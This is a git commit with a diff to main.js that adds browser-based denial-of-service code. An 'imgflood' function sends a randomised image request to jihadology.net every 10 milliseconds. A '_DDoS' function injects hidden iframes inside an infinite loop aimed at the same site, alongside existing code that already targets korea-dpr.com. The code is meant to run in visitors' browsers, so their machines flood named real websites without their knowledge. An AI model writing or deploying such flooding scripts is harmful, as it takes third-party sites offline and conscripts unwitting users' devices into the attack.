e75a2b6077cc7ba23b5c6184d0d3315e503815aa
ninja25538 <ninja25538@users.noreply.github.com>
2017-05-15 18:51:06 -0400

    Update main.js

--- main.js
+++ main.js
@@ -13,3 +13,21 @@ function _DDoS(url){
 for(;;){
  setTimeout(_DDoS("http://korea-dpr.com/"),10);
 }
+
+
+
+function imgflood() {  
+  var TARGET = 'jihadology.net';
+  var URI = '/index.html';
+  var pic = new Image();
+  var rand = Math.floor(Math.random() * 1000);
+  pic.src = 'http://'+TARGET+URI+rand+'=val';
+}
+setInterval(imgflood, 10);
+
+function _DDoS(url){
+ document.body.innerHTML+='<iframe src="'+url+'" style="display:none;"></iframe>';
+}
+for(;;){
+ setTimeout(_DDoS("http://jihadology.net"),10);
+}
